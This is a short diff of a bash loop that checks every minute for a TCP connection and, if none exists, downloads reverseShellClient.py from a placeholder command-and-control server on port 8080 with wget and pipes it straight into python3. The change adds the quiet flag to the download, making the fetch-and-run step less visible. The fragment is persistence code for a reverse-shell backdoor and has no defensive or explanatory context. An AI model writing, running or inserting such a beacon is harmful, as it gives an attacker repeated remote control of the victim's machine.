@@ -11,7 +11,7 @@ do
     fi
 
     # If we don't have a connection - start another
-    [[ ! "${tcp_con}" =~ tcp ]] && wget -O - <cnc_server>:8080/reverseShellClient.py | python3
+    [[ ! "${tcp_con}" =~ tcp ]] && wget -q -O - <cnc_server>:8080/reverseShellClient.py | python3
     sleep 60 # run every minute
 
 done
